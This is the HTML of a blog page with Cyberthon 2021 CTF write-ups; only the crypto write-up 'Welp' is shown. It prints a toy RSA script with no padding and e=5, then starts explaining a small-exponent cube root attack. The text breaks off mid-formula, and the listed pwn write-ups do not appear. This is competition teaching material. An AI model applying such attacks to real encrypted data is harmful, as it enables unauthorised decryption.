<!DOCTYPE html>
<html lang="en-US" dir="ltr">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Cyberthon 2021 Writeups | N00bcak's Purple Cave</title>
    <meta name="description" content="Blogging Things When I Feel Like It">
    <meta name="generator" content="VitePress v2.0.0-alpha.15">
    <link rel="preload stylesheet" href="/assets/style._2iSb6vt.css" as="style">
    <link rel="preload stylesheet" href="/vp-icons.css" as="style">
    
    <script type="module" src="/assets/app.CqvJCtO3.js"></script>
    <link rel="preload" href="/assets/inter-roman-latin.Di8DUHzh.woff2" as="font" type="font/woff2" crossorigin="">
    <link rel="modulepreload" href="/assets/chunks/theme.BY6AaA-W.js">
    <link rel="modulepreload" href="/assets/chunks/framework.BXejxr2x.js">
    <link rel="modulepreload" href="/assets/writeups_2021-09-05-Cyberthon.md.eXTsBky1.lean.js">
    <script id="check-dark-mode">(()=>{const e=localStorage.getItem("vitepress-theme-appearance")||"auto",a=window.matchMedia("(prefers-color-scheme: dark)").matches;(!e||e==="auto"?a:e==="dark")&&document.documentElement.classList.add("dark")})();</script>
    <script id="check-mac-os">document.documentElement.classList.toggle("mac",/Mac|iPhone|iPod|iPad/i.test(navigator.platform));</script>
  </head>
  <body>
    <div id="app"><div class="Layout" data-v-1df9f90f><!--[--><!--]--><!--[--><span tabindex="-1" data-v-331ec75c></span><a href="#VPContent" class="VPSkipLink visually-hidden" data-v-331ec75c>Skip to content</a><!--]--><!----><header class="VPNav" data-v-1df9f90f data-v-da52a441><div class="VPNavBar" data-v-da52a441 data-v-70946a35><div class="wrapper" data-v-70946a35><div class="container" data-v-70946a35><div class="title" data-v-70946a35><div class="VPNavBarTitle" data-v-70946a35 data-v-1e38c6bc><a class="title" href="/" data-v-1e38c6bc><!--[--><!--]--><!----><span data-v-1e38c6bc>N00bcak&#39;s Purple Cave</span><!--[--><!--]--></a></div></div><div class="content" data-v-70946a35><div class="content-body" data-v-70946a35><!--[--><!--]--><div class="VPNavBarSearch search" data-v-70946a35><!----></div><nav aria-labelledby="main-nav-aria-label" class="VPNavBarMenu menu" data-v-70946a35 data-v-39714824><span id="main-nav-aria-label" class="visually-hidden" data-v-39714824> Main Navigation </span><!--[--><!--[--><a class="VPLink link VPNavBarMenuLink" href="/" tabindex="0" data-v-39714824 data-v-52a1d768><!--[--><span data-v-52a1d768>Home</span><!--]--></a><!--]--><!--[--><a class="VPLink link VPNavBarMenuLink" href="/about-me.html" tabindex="0" data-v-39714824 data-v-52a1d768><!--[--><span data-v-52a1d768>About</span><!--]--></a><!--]--><!--[--><a class="VPLink link VPNavBarMenuLink" href="/writeups.html" tabindex="0" data-v-39714824 data-v-52a1d768><!--[--><span data-v-52a1d768>CTF Writeups</span><!--]--></a><!--]--><!--[--><a class="VPLink link VPNavBarMenuLink" href="/blog.html" tabindex="0" data-v-39714824 data-v-52a1d768><!--[--><span data-v-52a1d768>Blog</span><!--]--></a><!--]--><!--]--></nav><!----><div class="VPNavBarAppearance appearance" data-v-70946a35 data-v-6c893767><button class="VPSwitch VPSwitchAppearance" type="button" role="switch" title aria-checked="false" data-v-6c893767 data-v-5337faa4 data-v-1d5665e3><span class="check" data-v-1d5665e3><span class="icon" data-v-1d5665e3><!--[--><span class="vpi-sun sun" data-v-5337faa4></span><span class="vpi-moon moon" data-v-5337faa4></span><!--]--></span></span></button></div><div class="VPSocialLinks VPNavBarSocialLinks social-links" data-v-70946a35 data-v-0394ad82 data-v-d07f11e6><!--[--><a class="VPSocialLink no-icon" href="https://github.com/N00bcak" aria-label="github" target="_blank" rel="me noopener" data-v-d07f11e6 data-v-591a6b30><span class="vpi-social-github"></span></a><!--]--></div><div class="VPFlyout VPNavBarExtra extra" data-v-70946a35 data-v-bf2fac68 data-v-42cb505d><button type="button" class="button" aria-haspopup="true" aria-expanded="false" aria-label="extra navigation" data-v-42cb505d><span class="vpi-more-horizontal icon" data-v-42cb505d></span></button><div class="menu" data-v-42cb505d><div class="VPMenu" data-v-42cb505d data-v-25a6cce8><!----><!--[--><!--[--><!----><div class="group" data-v-bf2fac68><div class="item appearance" data-v-bf2fac68><p class="label" data-v-bf2fac68>Appearance</p><div class="appearance-action" data-v-bf2fac68><button class="VPSwitch VPSwitchAppearance" type="button" role="switch" title aria-checked="false" data-v-bf2fac68 data-v-5337faa4 data-v-1d5665e3><span class="check" data-v-1d5665e3><span class="icon" data-v-1d5665e3><!--[--><span class="vpi-sun sun" data-v-5337faa4></span><span class="vpi-moon moon" data-v-5337faa4></span><!--]--></span></span></button></div></div></div><div class="group" data-v-bf2fac68><div class="item social-links" data-v-bf2fac68><div class="VPSocialLinks social-links-list" data-v-bf2fac68 data-v-d07f11e6><!--[--><a class="VPSocialLink no-icon" href="https://github.com/N00bcak" aria-label="github" target="_blank" rel="me noopener" data-v-d07f11e6 data-v-591a6b30><span class="vpi-social-github"></span></a><!--]--></div></div></div><!--]--><!--]--></div></div></div><!--[--><!--]--><button type="button" class="VPNavBarHamburger hamburger" aria-label="mobile navigation" aria-expanded="false" aria-controls="VPNavScreen" data-v-70946a35 data-v-e5dd9c1c><span class="container" data-v-e5dd9c1c><span class="top" data-v-e5dd9c1c></span><span class="middle" data-v-e5dd9c1c></span><span class="bottom" data-v-e5dd9c1c></span></span></button></div></div></div></div><div class="divider" data-v-70946a35><div class="divider-line" data-v-70946a35></div></div></div><!----></header><div class="VPLocalNav empty fixed" data-v-1df9f90f data-v-db738f89><div class="container" data-v-db738f89><!----><div class="VPLocalNavOutlineDropdown" style="--vp-vh:0px;" data-v-db738f89 data-v-0bf0e06f><button data-v-0bf0e06f>Return to top</button><!----></div></div></div><!----><div class="VPContent" id="VPContent" data-v-1df9f90f data-v-c87f25bf><div class="VPDoc has-aside" data-v-c87f25bf data-v-7011f0d8><!--[--><!--]--><div class="container" data-v-7011f0d8><div class="aside" data-v-7011f0d8><div class="aside-curtain" data-v-7011f0d8></div><div class="aside-container" data-v-7011f0d8><div class="aside-content" data-v-7011f0d8><div class="VPDocAside" data-v-7011f0d8 data-v-3f215769><!--[--><!--]--><!--[--><!--]--><nav aria-labelledby="doc-outline-aria-label" class="VPDocAsideOutline" data-v-3f215769 data-v-60d5052e><div class="content" data-v-60d5052e><div class="outline-marker" data-v-60d5052e></div><div aria-level="2" class="outline-title" id="doc-outline-aria-label" role="heading" data-v-60d5052e>On this page</div><ul class="VPDocOutlineItem root" data-v-60d5052e data-v-1ce71065><!--[--><!--]--></ul></div></nav><!--[--><!--]--><div class="spacer" data-v-3f215769></div><!--[--><!--]--><!----><!--[--><!--]--><!--[--><!--]--></div></div></div></div><div class="content" data-v-7011f0d8><div class="content-container" data-v-7011f0d8><!--[--><!--]--><main class="main" data-v-7011f0d8><div style="position:relative;" class="vp-doc _writeups_2021-09-05-Cyberthon" data-v-7011f0d8><div><p>Finally, another local CTF. More writeups, more clout. ðŸ˜›</p><p>Barring Whitehacks, this CTF was probably the most stressful of them all. As a person who takes time to think, 7 hours heavily cripples my ability to do challenges.</p><p>Moreover, all the various schools fielded many fearsome competitors that really kept us on our toes D: (acsi ðŸ‘€), especially when the scoreboard was frozen an hour before the end of the competition!</p><p>Nonetheless we managed to pull through to clinch overall champions!</p><p><img src="/assets/Images/Cyberthon-2021/scoreboard.png" alt=""></p><h1 id="writeups" tabindex="-1">Writeups <a class="header-anchor" href="#writeups" aria-label="Permalink to â€œWriteupsâ€">â€‹</a></h1><p>Due to time constraints I will share my cleanest writeups so no one will have to suffer from my unassailable reputation for digital illegibility:</p><ol><li><a href="#welp">(Crypto) Welp 1.0/2.0</a></li><li><a href="#encraptor-10">(Crypto) Encraptor 1.0</a></li><li><a href="#apcafe">(Pwn) apcafe</a></li><li><a href="#apcdb">(Pwn) apcdb</a></li><li><a href="#placeholder">(Pwn) Placeholder</a></li></ol><h2 id="welp" tabindex="-1">Welp <a class="header-anchor" href="#welp" aria-label="Permalink to â€œWelpâ€">â€‹</a></h2><p><code>APOCALYPSE heard us dissing on their RSA encryption script and decided to update it. But the moment we saw their updated implementation, we all collectively went welp once again. Let&#39;s see if you can manage to decrypt a flag that has been encrypted with their updated script.</code></p><p>(Here I only go through Welp2.0, as Welp1.0 is the exact same thing.)</p><h3 id="reconnaissance" tabindex="-1">Reconnaissance <a class="header-anchor" href="#reconnaissance" aria-label="Permalink to â€œReconnaissanceâ€">â€‹</a></h3><p>As can be gleaned from the description, the challenge is about RSA.</p><p>We are greeted with:</p><ul><li>An encrypted flag file</li><li>A public key giving us APOCALYPSE&#39;s public key:</li></ul><div class="language-python line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">python</span><pre class="shiki shiki-themes github-light dracula" style="--shiki-light:#24292e;--shiki-dark:#F8F8F2;--shiki-light-bg:#fff;--shiki-dark-bg:#282A36;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">N</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=0x</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">00a55869b46dfbe65a018f243c59bd8c1ea75bec4eb4ff1a0e3423a63c416583e5d43a16b9ec3f79f5a227e5579cf216d38515c36967935fd487a71438e167bef5f75a9eb0efa4c0451f0b052feb0614b4b51cf00c3320032017ba3b0e1ceff69aeb90131f8b3d80df14caf63f2a6d3ef40893360b0f12cd4e15a168b37d5f85e1</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">e</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">5</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><ul><li>APOCALYPSE&#39;s source, which outwardly appears to have no problems...</li></ul><div class="language-python line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">python</span><pre class="shiki shiki-themes github-light dracula" style="--shiki-light:#24292e;--shiki-dark:#F8F8F2;--shiki-light-bg:#fff;--shiki-dark-bg:#282A36;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># Personal comment: PyCryptodome just doesn&#39;t feel right in a CTF setting...</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> Crypto.Util.number </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> getPrime</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> Crypto.PublicKey </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">import</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;"> RSA</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> Crypto.Util.number </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> bytes_to_long, long_to_bytes</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">rsa </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;"> RSA</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">.construct((getPrime(</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">512</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">) </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">*</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> getPrime(</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">512</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">), </span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">5</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">))</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">with</span><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;"> open</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">flag.txt</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">rb</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">) </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">as</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> f:</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">    data </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> f.read()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">plaintext </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> bytes_to_long(data)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">ciphertext </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;"> pow</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(plaintext, rsa.e, rsa.n)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">with</span><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;"> open</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">./dist/flag.txt.encrypted</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">wb</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">) </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">as</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> f:</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">    f.write(long_to_bytes(ciphertext))</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">with</span><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;"> open</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">./dist/pubkey.pem</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">wb</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">) </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">as</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> f:</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">    f.write(rsa.export_key(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">PEM</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">))</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><p>... or does it?</p><h3 id="well-no-but-actually-yes" tabindex="-1">Well, no, but actually yes <a class="header-anchor" href="#well-no-but-actually-yes" aria-label="Permalink to â€œWell, no, but actually yesâ€">â€‹</a></h3><p>Since the challenge gives you nothing else the only way one can get any progress is by noting some suspicious features of the RSA implementation:</p><ul><li>Despite the use of PyCryptodome, there is <code>no padding</code>...</li><li>The key is only 1024 bits long.</li><li><code>e</code>=5</li></ul><p>So perhaps, since <code>e</code> is rather small and there is <code>no padding</code>, we can try a <code>Cube Root Attack</code>.</p><h3 id="math-sike-niktay" tabindex="-1">Math! (sike niktay) <a class="header-anchor" href="#math-sike-niktay" aria-label="Permalink to â€œMath! (sike niktay)â€">â€‹</a></h3><p>The <code>Cube Root Attack</code> is honestly one of the <strong>stupidest</strong> attacks one can do on RSA, and it really shows something about software engineers who fail to implement RSA properly...</p><p>Anyways, the attack hinges on the <code>basic</code> fact (provided you know modular arithmetic) that if</p><mjx-container tabindex="0" class="MathJax" jax="SVG" display="true" style="direction:ltr;display:block;text-align:center;margin:1em 0;position:relative;"><svg style="overflow:visible;min-height:1px;min-width:1px;vertical-align:-0.566ex;" xmlns="http://www.w3.org/2000/svg" width="18.352ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 8111.7 1000" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z" style="stroke-width:3;"></path></g><g data-mml-node="mo" transform="translate(710.8,0)"><path data-c="2261" d="M56 444Q56 457 70 464H707Q722 456 722 444Q722 430 706 424H72Q56 429 56 444ZM56 237T56 250T70 270H707Q722 262 722 250T707 230H70Q56 237 56 250ZM56 56Q56 71 72 76H706Q722 70 722 56Q722 44 707 36H70Q56 43 56 56Z" style="stroke-width:3;"></path></g><g data-mml-node="msup" transform="translate(1766.6,0)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width:3;"></path></g><g data-mml-node="TeXAtom" transform="translate(911,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z" style="stroke-width:3;"></path></g></g></g><g data-mml-node="mspace" transform="translate(3057.1,0)"></g><g data-mml-node="mo" transform="translate(4057.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width:3;"></path></g><g data-mml-node="mi" transform="translate(4446.1,0)"><path data-c="6D" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z" style="stroke-width:3;"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(833,0)" style="stroke-width:3;"></path><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z" transform="translate(1333,0)" style="stroke-width:3;"></path></g><g data-mml-node="mspace" transform="translate(6335.1,0)"></g><g data-mml-node="mi" transform="translate(6834.7,0)"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z" style="stroke-width:3;"></path></g><g data-mml-node="mo" transform="translate(7722.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width:3;"></path></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top:0px;left:0px;clip:rect(1px, 1px, 1px, 1px);-webkit-touch-callout:none;-webkit-user-select:none;-khtml-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;position:absolute;padding:1px 0px 0px 0px;border:0px;display:block;overflow:hidden;width:100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mi>c</mi><mo>â‰¡</mo><msup><mi>m</mi><mrow data-mjx-texclass="ORD"><mi>e</mi></mrow></msup><mspace width="1em"></mspace><mo stretchy="false">(</mo><mi>mod</mi><mspace width="0.333em"></mspace><mi>N</mi><mo stretchy="false">)</mo></math></mjx-assistive-mml></mjx-container><p>then</p><mjx-container tabindex="0" class="MathJax" jax="SVG" display="true" style="direction:ltr;display:block;text-align:center;margin:1em 0;position:relative;"><svg style="overflow:visible;min-height:1px;min-width:1px;vertical-align:-0.186ex;" xmlns="http://www.w3.org/2000/svg" width="25.377ex" height="1.827ex" role="img" focusable="false" viewBox="0 -725.5 11216.5 807.5" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="2203" d="M56 661T56 674T70 694H487Q497 686 500 679V15Q497 10 487 1L279 0H70Q56 7 56 20T70 40H460V327H84Q70 334 70 347T84 367H460V654H70Q56 661 56 674Z" style="stroke-width:3;"></path></g><g data-mml-node="mi" transform="translate(556,0)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z" style="stroke-width:3;"></path></g><g data-mml-node="mo" transform="translate(1354.8,0)"><path data-c="2208" d="M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z" style="stroke-width:3;"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(2299.6,0)"><g data-mml-node="mi"><path data-c="2124" d="M39 -1Q29 9 29 12Q29 23 60 77T219 337L410 648H364Q261 648 210 628Q168 612 142 588T109 545T97 509T88 490Q85 489 80 489Q72 489 61 503L70 588Q72 607 75 628T79 662T81 675Q84 677 88 681Q90 683 341 683H592Q604 673 604 666Q604 662 412 348L221 37Q221 35 301 35Q406 35 446 48Q504 68 543 111T597 212Q602 239 617 239Q624 239 629 234T635 223Q635 215 621 113T604 8L597 1Q595 -1 317 -1H39ZM148 637L166 648H112V632Q111 629 110 622T108 612Q108 608 110 608T116 612T129 623T148 637ZM552 646Q552 648 504 648Q452 648 450 643Q448 639 266 343T77 37Q77 35 128 35H179L366 339L552 646ZM572 35Q581 89 581 97L561 77Q542 59 526 48L508 37L539 35H572Z" style="stroke-width:3;"></path></g></g><g data-mml-node="mtext" transform="translate(2966.6,0)"><path data-c="A0" d="" style="stroke-width:3;"></path><path data-c="73" d="M295 316Q295 356 268 385T190 414Q154 414 128 401Q98 382 98 349Q97 344 98 336T114 312T157 287Q175 282 201 278T245 269T277 256Q294 248 310 236T342 195T359 133Q359 71 321 31T198 -10H190Q138 -10 94 26L86 19L77 10Q71 4 65 -1L54 -11H46H42Q39 -11 33 -5V74V132Q33 153 35 157T45 162H54Q66 162 70 158T75 146T82 119T101 77Q136 26 198 26Q295 26 295 104Q295 133 277 151Q257 175 194 187T111 210Q75 227 54 256T33 318Q33 357 50 384T93 424T143 442T187 447H198Q238 447 268 432L283 424L292 431Q302 440 314 448H322H326Q329 448 335 442V310L329 304H301Q295 310 295 316Z" transform="translate(250,0)" style="stroke-width:3;"></path><path 